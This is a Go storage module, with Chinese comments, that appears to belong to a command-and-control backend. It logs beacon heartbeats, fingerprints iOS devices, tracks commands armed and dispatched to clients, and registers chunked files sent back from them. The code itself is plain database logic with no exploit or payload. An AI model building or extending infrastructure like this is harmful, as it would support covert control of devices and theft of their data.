package store

import (
	"encoding/json"
	"regexp"
	"strconv"
	"strings"
)

// RecordAccess access 流水落库。
func RecordAccess(rec map[string]any) int64 {
	ts, epoch := Now()
	return GetDB().Exec(
		"INSERT INTO access_log(ts, ts_epoch, role, method, path, query, host, client, ua, status, cost_ms)"+
			" VALUES(?,?,?,?,?,?,?,?,?,?,?)",
		ts, epoch,
		toStr(rec["role"]),
		toStr(rec["method"]),
		toStr(rec["path"]),
		toStr(rec["query"]),
		toStr(rec["host"]),
		toStr(rec["client"]),
		toStr(rec["ua"]),
		toInt(rec["status"]),
		toFloat(rec["cost_ms"]))
}

// RecordAccessBatch 批量 access 落库（单事务，高并发下大幅降抖动）。
func RecordAccessBatch(recs []map[string]any) {
	if len(recs) == 0 {
		return
	}
	rows := make([]SQLArgs, 0, len(recs))
	for _, rec := range recs {
		ts, epoch := Now()
		rows = append(rows, SQLArgs{
			SQL: "INSERT INTO access_log(ts, ts_epoch, role, method, path, query, host, client, ua, status, cost_ms)" +
				" VALUES(?,?,?,?,?,?,?,?,?,?,?)",
			Args: []any{ts, epoch,
				toStr(rec["role"]), toStr(rec["method"]), toStr(rec["path"]), toStr(rec["query"]),
				toStr(rec["host"]), toStr(rec["client"]), toStr(rec["ua"]),
				toInt(rec["status"]), toFloat(rec["cost_ms"])},
		})
	}
	GetDB().Many(rows)
}

// RecordPacket 正文已由 capture_store 落盘；这里补指纹 + 基本字段进索引。
// 同端点 + 同 sha256 视为重复回传体：不新增行、不动指针（保持首见）。
// MySQL 原子 UPSERT（ON DUPLICATE KEY UPDATE + LAST_INSERT_ID(id)）：
// 重复时返回既有 packet_id；beacon 心跳额外刷新 recv_ts/recv_epoch 保活。
// 返回 (packet_id, isDup)，调用方据此跳过派生入库并可丢弃重复落盘文件。
func RecordPacket(endpoint, filePath string, size int, raw []byte) (int64, bool) {
	db := GetDB()
	sha := sha256Hex(raw)
	ts, epoch := Now()
	kind, fields := Extract(endpoint, raw)
	res, err := db.ExecResult(
		"INSERT INTO packets(endpoint, recv_ts, recv_epoch, file_path, size, sha256, content_kind)"+
			" VALUES(?,?,?,?,?,?,?)"+
			" ON DUPLICATE KEY UPDATE"+
			" recv_ts=IF(VALUES(endpoint)='beacon',VALUES(recv_ts),recv_ts),"+
			" recv_epoch=IF(VALUES(endpoint)='beacon',VALUES(recv_epoch),recv_epoch),"+
			" id=LAST_INSERT_ID(id)",
		endpoint, ts, epoch, filePath, size, sha, kind)
	if err != nil {
		// 兜底（ODKU 已原子化，理论不可达）：按唯一键回读
		if row := db.QueryOne("SELECT id FROM packets WHERE endpoint=? AND sha256=?", endpoint, sha); row != nil {
			return toInt(row["id"]), true
		}
		return 0, false
	}
	pid, _ := res.LastInsertId()
	dup := false
	if n, _ := res.RowsAffected(); n != 1 {
		dup = true // 2=重复包刷新（beacon），0=重复包无变化
	}
	if dup || len(fields) == 0 {
		return pid, dup
	}
	rows := make([]SQLArgs, 0, len(fields))
	for _, f := range fields {
		rows = append(rows, SQLArgs{
			SQL: "INSERT INTO packet_meta(packet_id, field, value) VALUES(?,?,?)" +
				" ON DUPLICATE KEY UPDATE value=VALUES(value)",
			Args: []any{pid, f[0], f[1]},
		})
	}
	db.Many(rows)
	return pid, false
}

// RecordProbe log.html 同步探针流水。
func RecordProbe(entry map[string]any) int64 {
	ts, _ := Now()
	var entryID any
	if id := toInt(entry["id"]); id != 0 {
		entryID = id
	}
	hexv := toStr(entry["hex"])
	if hexv == "" {
		hexv = "0"
	}
	return GetDB().Exec(
		"INSERT INTO probe_log(ts, channel, entry_id, hex, text) VALUES(?,?,?,?,?)",
		ts, toStr(entry["channel"]), entryID, hexv, toStr(entry["text"]))
}

// RecordDevice 设备台账 UPSERT（首现登记 / 复见刷新 last_seen + 最新元数据）。
// 身份键 = (ip, ua, 规范化 device_version)：空 / unknown 视作 ''，IOS x.y.z 折叠为大版本
// （IOS 18.5 → IOS 18），避免同一台机器因版本读取抖动漂移成多行。
// MySQL 侧列已收敛为 NOT NULL DEFAULT ''（无需 COALESCE，可命中唯一索引）；
// 并发同身份插入撞唯一键（1062）时回读既有行刷新。
func RecordDevice(rec map[string]any) int64 {
	now, _ := Now()
	ip := toStr(rec["ip"])
	ua := toStr(rec["ua"])
	ver := normDeviceVer(toStr(rec["deviceVersion"]))
	db := GetDB()
	row := db.QueryOne(
		"SELECT id FROM devices WHERE ip=? AND ua=? AND device_version=?", ip, ua, ver)
	if row != nil {
		db.Exec(
			"UPDATE devices SET last_seen=?, domain=?, host=? WHERE id=?",
			now, toStr(rec["domain"]), toStr(rec["host"]), toInt(row["id"]))
		return toInt(row["id"])
	}
	// 原地升级：同一 (ip, ua) 已存在"无版本"行（早先版本未知）→ 补上版本，不另起新行，
	// 避免设备版本首次上报/上报抖动造成同机多行。
	if ver != "" {
		if sib := db.QueryOne(
			"SELECT id FROM devices WHERE ip=? AND ua=? AND device_version=''", ip, ua); sib != nil {
			db.Exec(
				"UPDATE devices SET device_version=?, last_seen=?, domain=?, host=? WHERE id=?",
				ver, now, toStr(rec["domain"]), toStr(rec["host"]), toInt(sib["id"]))
			return toInt(sib["id"])
		}
	} else {
		// ver 为空（unknown/桌面联调）：若同 (ip, ua) 已有任意行（含"有版本"行），
		// 只刷新 last_seen，不另起"无版本"行，避免同一台机器先有版本后无版本拆成两行。
		if any := db.QueryOne(
			"SELECT id FROM devices WHERE ip=? AND ua=? ORDER BY id LIMIT 1", ip, ua); any != nil {
			db.Exec(
				"UPDATE devices SET last_seen=?, domain=?, host=? WHERE id=?",
				now, toStr(rec["domain"]), toStr(rec["host"]), toInt(any["id"]))
			return toInt(any["id"])
		}
	}
	id := db.Exec(
		"INSERT INTO devices(first_seen, last_seen, ip, host, ua, device_version, domain)"+
			" VALUES(?,?,?,?,?,?,?)",
		now, now, ip, toStr(rec["host"]), ua, ver, toStr(rec["domain"]))
	if id == 0 {
		if row := db.QueryOne(
			"SELECT id FROM devices WHERE ip=? AND ua=? AND device_version=?", ip, ua, ver); row != nil {
			db.Exec(
				"UPDATE devices SET last_seen=?, domain=?, host=? WHERE id=?",
				now, toStr(rec["domain"]), toStr(rec["host"]), toInt(row["id"]))
			return toInt(row["id"])
		}
	}
	return id
}

// uaOSVerRe 从 UA 字符串里提取 iOS 主版本（"iPhone OS 18_5" / "CPU iPhone OS 18_6_2"）。
var uaOSVerRe = regexp.MustCompile(`(?i)(?:iPhone|iPad|iPod).*?OS[ _](\d+)[_.]`)

// normDeviceVer 版本归一：unknown/空 → ''；"IOS 18.5" / "iOS 18.6.2" → "IOS 18"；
// UA 字符串（根入口 reportEntry 曾用 navigator.userAgent 当 deviceVersion）→ 提取 iOS 主版本归一为 "IOS x"；
// 其余无法识别的 → ''（视为无版本），避免同一 IP 因版本字段脏乱被拆成多行。
func normDeviceVer(v string) string {
	v = strings.TrimSpace(v)
	if v == "" || strings.EqualFold(v, "unknown") {
		return ""
	}
	up := strings.ToUpper(v)
	if strings.HasPrefix(up, "IOS") {
		num := strings.TrimSpace(strings.TrimPrefix(up, "IOS"))
		// 取首个数字段的整数部分：18.6.2 → 18
		if i := strings.IndexAny(num, ". "); i >= 0 {
			num = num[:i]
		}
		if n, err := strconv.ParseInt(num, 10, 64); err == nil {
			return "IOS " + strconv.FormatInt(n, 10)
		}
		return ""
	}
	if m := uaOSVerRe.FindStringSubmatch(v); m != nil {
		return "IOS " + m[1]
	}
	return ""
}

// ── 指令生命周期审计 ──
func CommandArmed(cmd map[string]any, once bool) int64 {
	ts, _ := Now()
	params := cmd["params"]
	if params == nil {
		params = map[string]any{}
	}
	pj, _ := json.Marshal(params)
	return GetDB().Exec(
		"INSERT INTO commands(command_id, cmd_type, params_json, armed_ts, once, state)"+
			" VALUES(?,?,?,?,?,'armed')"+
			" ON DUPLICATE KEY UPDATE params_json=VALUES(params_json),"+
			" armed_ts=VALUES(armed_ts), once=VALUES(once), state='armed'",
		toStr(cmd["command_id"]), toStr(cmd["type"]), string(pj), ts, boolToInt(once))
}

func CommandDispatched(cmd map[string]any, clientIP string) int64 {
	ts, _ := Now()
	return GetDB().Exec(
		"UPDATE commands SET state='dispatched', dispatched_ts=?, client_ip=? WHERE command_id=? AND state='armed'",
		ts, clientIP, toStr(cmd["command_id"]))
}

func CommandCleared() int64 {
	return GetDB().Exec("UPDATE commands SET state='cleared' WHERE state='armed'")
}

// RecordPeEvent 遥测里程碑：仅 PE 上线。
func RecordPeEvent(kind, ip, ua, host, detail string) int64 {
	ts, epoch := Now()
	return GetDB().Exec(
		"INSERT INTO pe_events(ts, epoch, ip, ua, host, kind, detail) VALUES(?,?,?,?,?,?,?)",
		ts, epoch, ip, ua, host, kind, detail)
}

// PeEventsRecent 最近 n 条 PE 事件。
func PeEventsRecent(n int) []map[string]any {
	return GetDB().Query(
		"SELECT ts, ip, ua, host, detail FROM pe_events ORDER BY id DESC LIMIT ?", n)
}

// ── 分块归并 / 成品登记（chunk_store 专用） ──
func RecordChunk(commandID, fname string, part, size int, packetID *int64) int64 {
	ts, _ := Now()
	var pid any
	if packetID != nil {
		pid = *packetID
	}
	return GetDB().Exec(
		"INSERT IGNORE INTO chunks(command_id, fname, part, size, recv_ts, packet_id)"+
			" VALUES(?,?,?,?,?,?)",
		commandID, fname, part, size, ts, pid)
}

// RecordFile 指令产物登记：同 (command_id, fname, sha256, complete) 幂等，
// 重复重组（同一文件多次回传）只保留首个登记，避免成品表翻倍。
// 并发撞唯一键（1062）时回读既有行。
func RecordFile(commandID, fname, sha256 string, size int, filePath string, complete int) int64 {
	ts, _ := Now()
	db := GetDB()
	comp := boolToInt(complete != 0)
	if row := db.QueryOne(
		"SELECT id FROM files WHERE command_id=? AND fname=? AND sha256=? AND complete=?",
		commandID, fname, sha256, comp); row != nil {
		return toInt(row["id"])
	}
	id := db.Exec(
		"INSERT INTO files(command_id, fname, sha256, size, file_path, recv_ts, complete)"+
			" VALUES(?,?,?,?,?,?,?)",
		commandID, fname, sha256, size, filePath, ts, comp)
	if id == 0 {
		if row := db.QueryOne(
			"SELECT id FROM files WHERE command_id=? AND fname=? AND sha256=? AND complete=?",
			commandID, fname, sha256, comp); row != nil {
			return toInt(row["id"])
		}
	}
	return id
}

// ── 基础设施 ──
// SafeCall Entry-point 侧的防御包装：任何 ingest 失败都不阻断主链。
func SafeCall(fn func()) {
	defer func() { _ = recover() }()
	fn()
}

// SafeCallR 带返回值的防御包装。
func SafeCallR(fn func() any) (out any) {
	defer func() { _ = recover() }()
	return fn()
}
